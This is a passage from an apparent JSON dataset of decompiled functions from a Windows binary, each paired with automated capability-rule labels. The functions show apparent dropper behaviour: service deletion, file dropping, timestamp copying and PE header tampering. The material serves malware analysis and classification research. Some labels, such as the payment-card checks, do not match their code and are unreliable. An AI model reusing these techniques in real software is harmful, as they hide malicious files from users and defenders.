0);\n    return 1;\n}\n",
        "token_count": 1846
    },
    "004026b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004026b0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t hFile;\n    \n    hFile = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = str.gDI_;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n    if (arg_ch == -1) {\n        hFile = fcn.00401cd0(arg_8h);\n        if (hFile == -1) {\n            return 0;\n        }\n    }\n    iVar2 = hFile;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1136
    },
    "00402c80": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d7a) overlaps instruction at (ram,0x00402d71)\n// \n// WARNING: Removing unreachable block (ram,0x00402dbe)\n// WARNING: Removing unreachable block (ram,0x00402e39)\n\nuint __fastcall fcn.00402c80(uint param_1, uint param_2, int16_t *param_3)\n\n{\n    int16_t *piVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    int32_t unaff_EBX;\n    uchar *puVar7;\n    int32_t *piVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint *puVar12;\n    bool bVar13;\n    bool bVar14;\n    \n    puVar7 = &stack0xfffffffc;\n    if (*param_3 != 0x5a4d) {\n        return 0;\n    }\n    piVar8 = *(param_3 + 0x1e) + param_3;\n    if (*piVar8 != 0x4550) {\n        return 0;\n    }\n    piVar1 = piVar8[0x16];\n    if (piVar1 != NULL) {\n        return 0;\n    }\n    puVar11 = 0x40;\n    uVar6 = unaff_EBX & 0xff00 | unaff_EBX - 0x12;\n    if ((param_2 < uVar6) && (uVar6 <= param_2)) {\n        unaff_EBX = unaff_EBX + 1;\n        *0x8b39da56 = *0x8b39da56 ^ param_3;\n        puVar7 = &stack0xfffffffd;\n        *(param_3 + 0x401e3c) = *(param_3 + 0x401e3c);\n        bVar13 = false;\n        bVar14 = pe_dos_header == 0x0;\n        param_3 = piVar1;\n    }\n    else {\n        bVar13 = *(param_3 + 0x1e) < 0x80;\n        bVar14 = *(param_3 + 0x1e) == 0x80;\n    }\n    if (bVar13 || bVar14) {\n        return 0;\n    }\n    if ((bVar13) || (!bVar13)) {\n        puVar2 = *(param_3 + 0x1e);\n        if (0xbf < puVar2) goto code_r0x00402d87;\n    }\n    else {\n        *(piVar8 + 0x43d1773a) = *(piVar8 + 0x43d1773a) ^ 0x8b27e95e;\n        puVar2 = param_3 + !bVar13 + 0x7c8ecb0e;\n        *puVar2 = *puVar2;\n        *(unaff_EBX + 3) = *(unaff_EBX + 3) + (param_2 >> 8);\n    }\n    puVar11 = puVar2 + -0x80;\ncode_r0x00402d87:\n    puVar3 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar11);\n    *(puVar7 + -4) = puVar3;\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    puVar2 = NULL;\n    if (puVar11 != NULL) {\n        do {\n            iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n            puVar3 = *(puVar7 + -4);\n            puVar9 = puVar2 + 1;\n            puVar2[puVar3] = iVar4 % 0xff;\n            puVar2 = puVar9;\n        } while (puVar9 < puVar11);\n    }\n    puVar10 = puVar3;\n    puVar12 = *(puVar7 + 8) + 0x80;\n    for (uVar5 = puVar11 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar12 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    for (uVar5 = puVar11 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar12 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar3);\n    return 1;\n}\n",
        "token_count": 1076
    },
    "004020e0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004020e0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint var_4h;\n    \n    bVar1 = false;\n    bVar2 = arg_10h == 0;\n    while( true ) {\n        if (bVar2) {\n            return (arg_8h >> 0x10) + arg_8h;\n        }\n        if ((!bVar1 && !bVar2) && (bVar1 || bVar2)) break;\n        arg_8h = arg_8h + *arg_ch;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        bVar1 = 0xfffffffd < arg_ch;\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + -1;\n        bVar2 = arg_10h == 0;\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 286
    },
    "00402390": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402442) overlaps instruction at (ram,0x00402441)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00402390(uint lptstrFilename, uint s)\n\n{\n    uint uVar1;\n    ushort in_SS;\n    bool bVar2;\n    uint uStack124;\n    uint uStack120;\n    uint32_t uStack116;\n    uint32_t uStack112;\n    uint32_t uStack108;\n    uint32_t uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    uint *puStack88;\n    uint uStack84;\n    uint uStack80;\n    int32_t iStack76;\n    uint var_20h;\n    uint var_1ah;\n    uint pBlock;\n    uint dwLen;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint lpdwHandle;\n    \n    lpdwHandle = 0;\n    iStack76 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    if (iStack76 != 0) {\n        puLen = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        uStack100 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        uStack80 = lpdwHandle;\n        uStack84 = lptstrFilename;\n        puStack88 = 0x402403;\n        sub.VERSION.dll_GetFileVersionInfoA();\n        puStack88 = &fcn.00402390::puLen;\n        puStack92 = &fcn.00402390::lplpBuffer;\n        uStack96 = 0x40651c;\n        uStack104 = 0x402437;\n        sub.VERSION.dll_VerQueryValueA();\n        uStack116 = *(lplpBuffer + 0x10) >> 0x10;\n        uStack104 = *(lplpBuffer + 0x14);\n        uStack108 = *(lplpBuffer + 0x14) >> 0x10;\n        uStack112 = *(lplpBuffer + 0x10);\n        uStack120 = 0x4064e0;\n        uStack124 = s;\n        (*_sym.imp.MSVCRT.dll_sprintf)();\n        bVar2 = (POPCOUNT(&stack0xffffff9c & 0xff) & 1U) == 0;\n        if (((!bVar2) && (bVar2)) && (segment(in_SS, *0x10 + -100),  &stack0xffffff84 < 0xffffffe8)) {\n            if (bVar2) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uStack100 = 0xb7bc9ea5;\n        }\n        uStack108 = 0x4024c2;\n        uStack104 = uVar1;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n        uStack112 = 0x4024e7;\n        uStack108 = uVar1;\n        (*_sym.imp.KERNEL32.dll_GlobalFree)();\n    }\n    return 1;\n}\n",
        "token_count": 690
    },
    "004038a0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040390f) overlaps instruction at (ram,0x0040390d)\n// \n// WARNING: Removing unreachable block (ram,0x0040390f)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004038a0(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    ushort in_SS;\n    bool bVar5;\n    uint var_4h;\n    \n    uVar1 = fcn.004020e0(0, arg_8h, arg_ch + 1U >> 1);\n    uVar3 = uVar1 & 0xffff;\n    bVar5 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n    if (((!bVar5) && (bVar5)) && (segment(in_SS, *0x10 + -0x14),  bVar5)) {\n        fcn.004021a0(arg_18h, arg_1ch);\n        return 1;\n    }\n    iVar2 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar1 = *(iVar2 + 0x58);\n    if (uVar3 < uVar1) {\n        iVar4 = (uVar3 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        iVar4 = uVar3 - (uVar1 & 0xffff);\n    }\n    if (iVar4 < uVar1 >> 0x10) {\n        iVar4 = (iVar4 - (uVar1 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar4 = iVar4 - (uVar1 >> 0x10);\n    }\n    *arg_14h = iVar4 + arg_ch;\n    *arg_10h = *(iVar2 + 0x58);\n    return iVar2;\n}\n",
        "token_count": 484
    },
    "00402650": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040266b) overlaps instruction at (ram,0x00402668)\n// \n\nuint __cdecl fcn.00402650(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t *in_EDX;\n    \n    *in_EDX = *in_EDX | 0x5d;\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(0x98);\n    if (iVar1 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 123
    },
    "00402800": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402800(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401cd0(0x406010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "004039f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403a44) overlaps instruction at (ram,0x00403a43)\n// \n// WARNING: Removing unreachable block (ram,0x00403a41)\n\nuint __cdecl fcn.004039f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint *puVar6;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar4 = (**0x41f628)(2, 0);\n    if (iVar4 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar6 = &var_128h;\n    for (iVar5 = 0x49; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar5 = (**0x41f62c)(iVar4, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    iVar1 = extraout_ECX;\n    do {\n        if (iVar5 == 0) {\ncode_r0x00403ab4:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            return var_4h;\n        }\n        if ((0 < iVar5) && (iVar5 < 1)) {\n            if (iVar1 == 0) {\n                uVar3 = in(0x5d);\n                return uVar3;\n            }\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iVar5 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar5 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00403ab4;\n        }\n        iVar5 = (**0x41f630)(iVar4, &var_12ch);\n        iVar1 = extraout_ECX_00;\n    } while( true );\n}\n",
        "token_count": 555
    },
    "00403fb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040404e) overlaps instruction at (ram,0x0040404d)\n// \n\nuint __cdecl fcn.00403fb0(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *unaff_EBX;\n    uint *puVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    bool in_CF;\n    bool bVar8;\n    int32_t iStack00000014;\n    int32_t iStack00000018;\n    int32_t iStack0000001c;\n    uint uStack00000020;\n    int32_t iStack00000024;\n    uint uStack16;\n    \n    puVar5 = &stack0xfffffffc;\n    if ((!in_CF) && (in_CF)) {\n        iStack00000014 = in_EAX + 1;\n        if (*in_EAX <= &stack0xfffffff8 && iStack00000014 != 0) {\n            uStack00000020 = 0x41f5f0;\n            iStack00000018 = iStack00000014;\n            iStack0000001c = iStack00000014;\n            iStack00000024 = iStack00000014;\n            uVar2 = (*_sym.imp.USER32.dll_RegisterClassExA)();\n            return uVar2;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar3 = fcn.004039f0(0x40607c);\n    bVar8 = iVar3 == -1;\n    if (bVar8) {\n        return 0;\n    }\n    puVar7 = &stack0xfffffffc;\n    if ((!bVar8) && (puVar7 = &stack0xfffffffc,  bVar8)) {\n        puVar6 = &stack0xfffffff4;\n        puVar7 = &stack0xfffffff4;\n        cVar1 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar3);\n    bVar8 = iVar3 == 0;\n    if (!bVar8) {\n        if ((!bVar8) && (bVar8)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(*(puVar7 + 8), iVar3, 0, 0, 0, 2);\n        iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar4 != 0) {\n            if ((iVar4 < 0) || (iVar4 >= 0)) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            }\n            else {\n                *unaff_EBX = *unaff_EBX & 0xc3;\n            }\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 758
    },
    "00404060": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404110) overlaps instruction at (ram,0x0040410e)\n// \n\nuint __cdecl fcn.00404060(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t arg_8h_01;\n    uint arg_ch_00;\n    \n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    arg_8h_01 = arg_8h_00;\n    arg_ch_00 = arg_ch;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &arg_8h, 0);\n    if (iVar1 != 0) {\n        if (*0x41f608 != 0) {\n            iVar1 = fcn.00403fb0(arg_8h_00);\n            *0x41f608 = iVar1 == 0;\n        }\n        fcn.004026b0(arg_8h_01, arg_ch_00);\n        if (*0x41f608 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 350
    },
    "00403ee0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ee0(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00401c50(hSCManager, arg_8h);\n    uVar1 = fcn.00403190(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00403750": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403837) overlaps instruction at (ram,0x00403835)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00403750(uint param_1, uint param_2, uint32_t param_3, uint32_t param_4, uint param_5, uint param_6)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    char cVar3;\n    uchar *puVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint32_t arg_18h;\n    int32_t iVar9;\n    char *unaff_EBX;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar10;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    float10 extraout_ST0;\n    uchar uStack44;\n    uint uStack43;\n    uint8_t auStack36 [24];\n    uint *puStack12;\n    uint uStack8;\n    \n    puStack12 = fcn.00403200(param_5, param_6, str.Qr, 7);\n    if (puStack12 == NULL) {\n        return 0;\n    }\n    puVar8 = &uStack44 + 1;\n    for (iVar9 = 7; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    uStack8 = 0;\n    do {\n        uVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n        uVar6 = uVar6 & 0x800000ff;\n        if (uVar6 < 0) {\n            uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n        }\n        (&uStack44)[uStack8] = uVar6;\n        uVar7 = uStack8 + 1;\n        bVar11 = uVar7 < 0x20;\n        bVar13 = -1 < uStack8 - 0x1f;\n        bVar12 = uVar7 == 0x20;\n        uStack8 = uVar7;\n    } while (bVar11);\n    if ((bVar13) && (!bVar13)) {\n        *(puVar8 + 0x1f) = extraout_ST0;\n        bVar11 = *(unaff_ESI + 4) < *(puVar8 + 7);\n        bVar12 = *(unaff_ESI + 4) == *(puVar8 + 7);\n    }\n    puVar8 = &uStack44;\n    puVar10 = puStack12;\n    for (uVar7 = 8; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar10 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    if ((bVar11 || bVar12) || (puVar8 = puStack12,  !bVar11 && !bVar12)) {\n        puVar8 = &uStack44;\n        uVar7 = param_4;\n        uVar6 = param_3;\n    }\n    cVar3 = *unaff_EBX;\n    puVar1 = puVar10 + -0x75;\n    puVar4 = *puVar1;\n    *puVar1 = *puVar1 - &stack0xffffffc8;\n    uVar5 = puVar8 + 0x8b;\n    arg_18h = puVar8 & 0xffffff00 | uVar5 + (puVar4 < &stack0xffffffc8);\n    pcVar2 = arg_18h - 0x73;\n    *pcVar2 = *pcVar2 + uVar6 + (0x74 < puVar8 || CARRY1(uVar5, puVar4 < &stack0xffffffc8));\n    fcn.00403d10(param_1, param_2, uVar6, uVar7 & 0xffff0000 | CONCAT11((uVar7 >> 8) - cVar3, uVar7), arg_18h, \n                 &uStack8 + 3, unaff_EDI);\n    fcn.004021a0(param_5, param_6);\n    return 1;\n}\n",
        "token_count": 1024
    },
    "00403f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00403f50(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402e60;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x41f5f0;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 221
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    // [00] -r-x section size 16384 named .text\n    iVar4 = fcn.00403f50(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00403b60(argv),  pcVar2 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar3 = _sym.imp.USER32.dll_GetDesktopWindow;\n        pcVar1 = _sym.imp.USER32.dll_TranslateMessage;\n        while (iVar5 != 0) {\n            (*pcVar1)(&lpMsg);\n            (*pcVar3)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar2)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "00401bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401be0) overlaps instruction at (ram,0x00401bde)\n// \n\nint32_t fcn.00401bd0(void)\n\n{\n    uint32_t *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    code *pcVar3;\n    int32_t unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        pcVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n    }\n    else {\n        puVar1 = unaff_EDI + -1;\n        puVar2 = *puVar1;\n        *puVar1 = *puVar1 - *0x10;\n        pcVar3 = sym.imp.MSVCRT.dll_rand + (puVar2 < *0x10) + in_EAX;\n    }\n    return pcVar3 % 5 + 3;\n}\n",
        "token_count": 221
    },
    "00401c00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00401c00(void)\n\n{\n    uint uVar1;\n    \n    if (*0x41f604 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41f604 = 1;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00401c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401c50(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 128
    },
    "00401dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401dc0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool in_CF;\n    \n    if ((!in_CF) && (in_CF)) {\n        out(0xbd, in_EAX);\n        return;\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "00401e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
